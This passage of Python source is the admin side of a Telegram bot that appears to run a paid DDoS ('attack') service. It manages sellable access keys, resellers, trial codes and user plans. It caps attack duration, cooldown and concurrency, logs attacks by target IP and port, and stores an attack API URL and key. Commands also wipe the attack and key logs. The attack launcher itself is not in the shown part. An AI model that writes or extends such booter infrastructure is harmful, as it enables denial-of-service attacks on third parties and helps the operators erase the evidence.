    if not is_admin_or_owner(message.from_user.id):
        return
    n = 10
    parts = message.text.split()
    if len(parts) == 2:
        try: n = int(parts[1])
        except: pass
    logs = list(attack_logs_col.find().sort("timestamp", -1).limit(n))
    if not logs:
        bot.reply_to(message, "ð No attack logs.")
        return
    text = f"ð Last {len(logs)} Attacks:\n\n" + "\n".join(f"â¢ {datetime.fromisoformat(l['timestamp']).strftime('%m-%d %H:%M')} | {l['user_id']} | {l['target']}:{l['port']} | {l['duration']}s | {l['status']}" for l in reversed(logs))
    bot.reply_to(message, text[:4000])

@bot.message_handler(commands=['server_stats'])
def server_stats(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    cpu = psutil.cpu_percent(interval=1)
    mem = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    uptime = str(timedelta(seconds=time.time() - psutil.boot_time())).split('.')[0]
    text = f"ð¥ Server Stats\n\nCPU: {cpu}%\nMemory: {mem.percent}% ({mem.used//(1024**2)} MB / {mem.total//(1024**2)} MB)\nDisk: {disk.percent}% ({disk.free//(1024**3)} GB free)\nUptime: {uptime}\nActive Attacks: {get_active_attack_count()}/{get_setting('max_concurrent_attacks', DEFAULT_MAX_CONCURRENT)}"
    bot.reply_to(message, text)

@bot.message_handler(commands=['view_code_logs'])
def view_code_logs(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    n = 10
    parts = message.text.split()
    if len(parts) == 2:
        try: n = int(parts[1])
        except: pass
    logs = list(key_logs_col.find().sort("timestamp", -1).limit(n))
    if not logs:
        bot.reply_to(message, "ð No key logs.")
        return
    text = "ð Key Events:\n\n" + "\n".join(f"â¢ {datetime.fromisoformat(l['timestamp']).strftime('%m-%d %H:%M')} | {l['event']} | {l['code']} | By: {l.get('created_by','')} | User: {l.get('redeemed_by','')}" for l in reversed(logs))
    bot.reply_to(message, text[:4000])

@bot.message_handler(commands=['list_codes'])
def list_codes(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    codes = list(keys_col.find({"redeemed_by": None, "expires": {"$gt": datetime.now().isoformat()}}))
    if not codes:
        bot.reply_to(message, "ð No active codes.")
        return
    text = f"ð Active Codes ({len(codes)}):\n\n" + "\n".join(f"â¢ {c['_id']} â {c.get('type','?')} â Expires: {datetime.fromisoformat(c['expires']).strftime('%Y-%m-%d %H:%M')}" for c in codes[:50])
    if len(codes) > 50:
        text += f"\n... and {len(codes)-50} more."
    bot.reply_to(message, text)

@bot.message_handler(commands=['list_code'])
def list_code_command(message):
    list_codes(message)

@bot.message_handler(commands=['delete_code'])
def delete_code_command(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /delete_code <code>")
        return
    code = parts[1].upper()
    result = keys_col.delete_one({"_id": code})
    if result.deleted_count:
        log_key_event("deleted", code)
        bot.reply_to(message, f"â Code {code} deleted.")
    else:
        bot.reply_to(message, "â Code not found.")

@bot.message_handler(commands=['block_code'])
def block_code(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /block_code <code>")
        return
    code = parts[1].upper()
    if blocked_codes_col.count_documents({"_id": code}) > 0:
        bot.reply_to(message, "â ï¸ Already blocked.")
        return
    blocked_codes_col.insert_one({"_id": code})
    log_key_event("blocked", code)
    key = keys_col.find_one({"_id": code})
    if key and key.get("redeemed_by"):
        plans_col.delete_one({"_id": str(key["redeemed_by"])})
        log_key_event("plan revoked", code, redeemed_by=key["redeemed_by"])
    bot.reply_to(message, f"ð« Code {code} blocked. Access revoked.")

@bot.message_handler(commands=['key_state'])
def key_state_command(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /key_state <code>")
        return
    code = parts[1].upper()
    key = keys_col.find_one({"_id": code})
    if not key:
        bot.reply_to(message, "â Code not found.")
        return
    expires = datetime.fromisoformat(key["expires"])
    now = datetime.now()
    text = f"""ð <b>Key State:</b> {code}

Type: {key.get('type','unknown')}
Attacks: {'Unlimited' if key['attacks_left']==-1 else key['attacks_left']}
Max Duration: {key['max_duration']}s
Cooldown: {key['cooldown']}s
Expires: {expires.strftime('%Y-%m-%d %H:%M:%S')} {'(Expired)' if now>expires else '(Valid)'}
Redeemed: {'Yes' if key.get('redeemed_by') else 'No'}
Redeemer: {key.get('redeemed_by', 'N/A')}
Blocked: {'Yes' if blocked_codes_col.count_documents({'_id': code})>0 else 'No'}
Trial: {'Yes' if key.get('trial') else 'No'}"""
    bot.reply_to(message, text, parse_mode="HTML")

@bot.message_handler(commands=['private_users'])
def private_users_command(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    plans = list(plans_col.find({"expires": {"$gt": datetime.now().isoformat()}}))
    if not plans:
        bot.reply_to(message, "ð No private users.")
        return
    text = "ð¥ Private Users with Active Plans:\n\n"
    for plan in plans:
        uid = plan["_id"]
        try:
            user = bot.get_chat(int(uid))
            username = f"@{user.username}" if user.username else "No username"
            name = html.escape(user.first_name or "")
        except:
            username = "Unknown"; name = ""
        code = plan.get("redeemed_code", "Unknown")
        expires = datetime.fromisoformat(plan["expires"])
        remaining = expires - datetime.now()
        text += f"â¢ {uid} | {username} | {name}\n  Code: {code} â {remaining.days}d {remaining.seconds//3600}h left\n\n"
    bot.reply_to(message, text[:4000], parse_mode="HTML")

# ------------------ Settings ------------------
@bot.message_handler(commands=['settime'])
def set_max_time(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /settime <seconds>")
        return
    try:
        t = int(parts[1])
        if t < 10 or t > 600:
            bot.reply_to(message, "â Time must be 10-600s.")
            return
        update_setting("max_attack_time", t)
        plans_col.update_many({}, {"$set": {"max_duration": t}})
        bot.reply_to(message, f"â Global max time = {t}s. All plans updated.")
    except:
        bot.reply_to(message, "â Invalid number.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /setcooldown <seconds>")
        return
    try:
        c = int(parts[1])
        if c < 0 or c > 600:
            bot.reply_to(message, "â Cooldown must be 0-600s.")
            return
        update_setting("cooldown", c)
        plans_col.update_many({}, {"$set": {"cooldown": c}})
        bot.reply_to(message, f"â Global cooldown = {c}s. All plans updated.")
    except:
        bot.reply_to(message, "â Invalid number.")

@bot.message_handler(commands=['setconcurrent'])
def set_concurrent(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /setconcurrent <number>")
        return
    try:
        num = int(parts[1])
        if num < 1 or num > 50:
            bot.reply_to(message, "â Number must be 1-50.")
            return
        update_setting("max_concurrent_attacks", num)
        bot.reply_to(message, f"â Max concurrent attacks = {num}.")
    except:
        bot.reply_to(message, "â Invalid number.")

@bot.message_handler(commands=['setapi'])
def set_api(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 3:
        bot.reply_to(message, "â ï¸ Usage: /setapi <url> <api_key>")
        return
    url = parts[1]
    key = ' '.join(parts[2:])
    update_setting("api_url", url)
    update_setting("api_key", key)
    bot.reply_to(message, f"â API set:\nURL: {url}\nKey: {key[:6]}...{key[-4:]}")

@bot.message_handler(commands=['set_max_attack'])
def set_max_attack(message):
    set_max_time(message)

@bot.message_handler(commands=['port_protection'])
def toggle_port_protection(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2 or parts[1].lower() not in ['on','off']:
        bot.reply_to(message, "â ï¸ Usage: /port_protection on/off")
        return
    state = parts[1].lower() == 'on'
    update_setting("port_protection", state)
    bot.reply_to(message, f"ð¡ï¸ Port Protection: {'ON â' if state else 'OFF â'}")

@bot.message_handler(commands=['feedback'])
def toggle_feedback(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2 or parts[1].lower() not in ['on','off']:
        bot.reply_to(message, "â ï¸ Usage: /feedback on/off")
        return
    state = parts[1].lower() == 'on'
    update_setting("feedback_system", state)
    if not state:
        pending_feedback_col.delete_many({})
    bot.reply_to(message, f"ð¸ Feedback System: {'ON â' if state else 'OFF â'}")

@bot.message_handler(commands=['maintenance'])
def toggle_maintenance(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2 or parts[1].lower() not in ['on','off']:
        bot.reply_to(message, "â ï¸ Usage: /maintenance on/off")
        return
    state = parts[1].lower() == 'on'
    old = get_setting("maintenance_mode", False)
    update_setting("maintenance_mode", state)
    if not state and old:
        start_str = get_setting("maintenance_start_time")
        if start_str:
            seconds = int((datetime.now() - datetime.fromisoformat(start_str)).total_seconds())
            if seconds > 0:
                count = 0
                for plan in plans_col.find({"expires": {"$gt": datetime.now().isoformat()}}):
                    code = plan.get("redeemed_code")
                    if not code: continue
                    key = keys_col.find_one({"_id": code})
                    if not key or not key.get("duration_days"): continue
                    created_at = datetime.fromisoformat(key["created_at"])
                    max_expiry = created_at + timedelta(days=key["duration_days"])
                    new_expiry = min(datetime.fromisoformat(plan["expires"]) + timedelta(seconds=seconds), max_expiry)
                    if new_expiry > datetime.fromisoformat(plan["expires"]):
                        plans_col.update_one({"_id": plan["_id"]}, {"$set": {"expires": new_expiry.isoformat()}})
                        count += 1
                bot.reply_to(message, f"â Maintenance ended. Extended {count} plans by up to {seconds}s.")
            else:
                bot.reply_to(message, "â Maintenance ended.")
        update_setting("maintenance_start_time", None)
    elif state and not old:
        update_setting("maintenance_start_time", datetime.now().isoformat())
        bot.reply_to(message, "ð ï¸ Maintenance Mode ON. Only owner can use the bot.")
    else:
        bot.reply_to(message, f"ð§ Maintenance Mode: {'ON ð ï¸' if state else 'OFF â'}")

@bot.message_handler(commands=['block_port'])
def block_port(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "â ï¸ Usage: /block_port <ip> <port>")
        return
    ip, port = parts[1], parts[2]
    if not validate_target(ip):
        bot.reply_to(message, "â Invalid IP.")
        return
    try:
        p = int(port)
        if p < 1 or p > 65535:
            bot.reply_to(message, "â Invalid port.")
            return
    except:
        bot.reply_to(message, "â Invalid port.")
        return
    key = f"{ip}:{port}"
    settings_col.update_one({"_id": "blocked_ports"}, {"$set": {key: datetime.now().strftime('%d-%m-%Y %H:%M:%S')}}, upsert=True)
    bot.reply_to(message, f"ð« Port Blocked: {key} for 2 hours.")

@bot.message_handler(commands=['unblock_port'])
def unblock_port(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "â ï¸ Usage: /unblock_port <ip> <port>")
        return
    key = f"{parts[1]}:{parts[2]}"
    settings_col.update_one({"_id": "blocked_ports"}, {"$unset": {key: ""}})
    bot.reply_to(message, f"â Port Unblocked: {key}")

@bot.message_handler(commands=['blocked_ports'])
def list_blocked_ports(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    blocked = settings_col.find_one({"_id": "blocked_ports"})
    if not blocked or len(blocked) <= 1:
        bot.reply_to(message, "ð No blocked ports.")
        return
    blocked.pop("_id", None)
    text = "ð« Blocked Ports:\n\n"
    for i, (key, t) in enumerate(blocked.items(), 1):
        block_time = datetime.strptime(t, '%d-%m-%Y %H:%M:%S')
        remaining = max(0, PORT_BLOCK_DURATION - (datetime.now() - block_time).total_seconds())
        mins = int(remaining // 60)
        text += f"{i}. {key} â {mins} min remaining\n"
    bot.reply_to(message, text)

# ------------------ Time Management ------------------
@bot.message_handler(commands=['extend_all_users'])
def extend_all_users(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /extend_all_users <seconds>")
        return
    try:
        sec = int(parts[1])
    except:
        bot.reply_to(message, "â Invalid seconds.")
        return
    count = 0
    for plan in plans_col.find({"expires": {"$gt": datetime.now().isoformat()}}):
        code = plan.get("redeemed_code")
        if code:
            key = keys_col.find_one({"_id": code})
            if key and key.get("duration_days") and key.get("created_at"):
                max_expiry = datetime.fromisoformat(key["created_at"]) + timedelta(days=key["duration_days"])
                new_expiry = min(datetime.fromisoformat(plan["expires"]) + timedelta(seconds=sec), max_expiry)
                plans_col.update_one({"_id": plan["_id"]}, {"$set": {"expires": new_expiry.isoformat()}})
                count += 1
                continue
        plans_col.update_one({"_id": plan["_id"]}, {"$set": {"expires": (datetime.fromisoformat(plan["expires"]) + timedelta(seconds=sec)).isoformat()}})
        count += 1
    bot.reply_to(message, f"â Extended {count} plans by {sec}s (capped).")

@bot.message_handler(commands=['deduct_all'])
def deduct_all(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "â ï¸ Usage: /deduct_all <seconds>")
        return
    try:
        sec = int(parts[1])
    except:
        bot.reply_to(message, "â Invalid seconds.")
        return
    count = 0
    for plan in plans_col.find({"expires": {"$gt": datetime.now().isoformat()}}):
        new_expiry = datetime.fromisoformat(plan["expires"]) - timedelta(seconds=sec)
        if new_expiry <= datetime.now():
            new_expiry = datetime.now() - timedelta(seconds=1)
        plans_col.update_one({"_id": plan["_id"]}, {"$set": {"expires": new_expiry.isoformat()}})
        count += 1
    bot.reply_to(message, f"â Deducted {sec}s from {count} plans.")

@bot.message_handler(commands=['deduct_time'])
def deduct_time(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) != 3:
        bot.reply_to(message, "â ï¸ Usage: /deduct_time <code> <seconds>")
        return
    code = parts[1].upper()
    try:
        sec = int(parts[2])
    except:
        bot.reply_to(message, "â Invalid seconds.")
        return
    key = keys_col.find_one({"_id": code})
    if not key or not key.get("redeemed_by"):
        bot.reply_to(message, "â Code not redeemed.")
        return
    plan = plans_col.find_one({"_id": str(key["redeemed_by"])})
    if not plan:
        bot.reply_to(message, "â Plan not found.")
        return
    new_expiry = datetime.fromisoformat(plan["expires"]) - timedelta(seconds=sec)
    if new_expiry <= datetime.now():
        new_expiry = datetime.now() - timedelta(seconds=1)
    plans_col.update_one({"_id": str(key["redeemed_by"])}, {"$set": {"expires": new_expiry.isoformat()}})
    bot.reply_to(message, f"â Deducted {sec}s from user {key['redeemed_by']}.")

# ------------------ Delete Logs ------------------
@bot.message_handler(commands=['deletelogs_attack'])
def deletelogs_attack(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    attack_logs_col.delete_many({})
    bot.reply_to(message, "â Attack logs deleted.")

@bot.message_handler(commands=['deletelogs_key'])
def deletelogs_key(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    key_logs_col.delete_many({})
    bot.reply_to(message, "â Key logs deleted.")

@bot.message_handler(commands=['deletelogs_all'])
def deletelogs_all(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    attack_logs_col.delete_many({})
    key_logs_col.delete_many({})
    admin_logs_col.delete_many({})
    bot.reply_to(message, "â All logs deleted.")

@bot.message_handler(commands=['export_data'])
def export_data(message):
    if not is_admin_or_owner(message.from_user.id):
        return
    data = {}
    for col in db.list_collection_names():
        data[col] = list(db[col].find({}, {'_id': 0}))
    filename = "db_export.json"
    with open(filename, 'w') as f:
        json.dump(data, f, indent=2, default=str)
    with open(filename, 'rb') as f:
        bot.send_document(message.chat.id, f, visible_file_name=filename)
    os.remove(filename)

# ------------------ Background Auto Refresh (every 10 seconds) ------------------
def background_refresh():
    """Runs every 10 seconds to clean expired attacks and refresh status trackers."""
    while True:
        time.sleep(10)
        # Clean expired attacks
        with _attack_lock:
            now = datetime.now()
            expired = [k for k, v in active_attacks.items() if v['end_time'] <= now]
            for k in expired:
                del active_attacks[k]
        # Optional: you can also refresh any other cached data here

# Start the background thread
background_thread = threading.Thread(target=background_refresh, daemon=True)
background_thread.start()

# ------------------ Catch-all ------------------
@bot.message_handler(func=lambda m: True)
def handle_unknown(message):
    if message.text and message.text.startswith('/'):
        cmd = message.text.split()[0].lower()
        known = ['start', 'owner', 'state', 'approve', 'disapprove', 'approved_groups', 'ban', 'unban', 'banned_list', 'list_banned',
                 'add_reseller', 'remove_reseller', 'resellers', 'addcredit', 'removecredit', 'reseller_credits',
                 'genkey', 'gentrial', 'gentrialfor', 'deletetrials', 'deletealltrials', 'gen', 'redeem', 'broadcast',
                 'settime', 'setcooldown', 'setconcurrent', 'setapi', 'port_protection', 'feedback', 'block_port', 'unblock_port',
                 'blocked_ports', 'attack', 'status', 'help', 'ping', 'getid', 'id', 'group_info', 'check_my_access',
                 'reseller_panel', 'mycredits', 'mycredit', 'stats', 'view_logs', 'server_stats', 'view_code_logs',
                 'list_codes', 'list_code', 'delete_code', 'block_code', 'key_state', 'maintenance', 'export_data',
                 'extend_all_users', 'deduct_all', 'deduct_time', 'deletelogs_attack', 'deletelogs_key', 'deletelogs_all',
                 'reseller_info', 'private_users', 'report', 'addadmin', 'removeadmin', 'admins', 'adminlogs',
                 'view_reseller_attack', 'users', 'remove', 'remove_expired', 'set_reseller_expire', 'list_reseller',
                 'set_max_attack', 'reset_user', 'get_user_info', 'set_user_limit', 'reset_attack_limit', 'backup_users',
                 'add_admin', 'remove_admin', 'list_admins']
        if cmd[1:] not in known:
            bot.reply_to(message, f"â Unknown command: {cmd}\n\nUse /help to see available commands.")
    else:
        if get_setting("feedback_system", False) and not is_group(message) and message.content_type == 'photo':
            try:
                bot.forward_message(BOT_OWNER, message.chat.id, message.message_id)
                bot.reply_to(message, "ð¸ Feedback sent to owner. Thank you!")
            except:
                pass

print("Bot starting...")
print(f"API URL: {get_setting('api_url', DEFAULT_API_URL)}")
print(f"API Key: {get_setting('api_key', DEFAULT_API_KEY)[:10]}...")
while True:
    try:
        bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
    except Exception as e:
        print(f"Polling error: {e}")
        time.sleep(5)
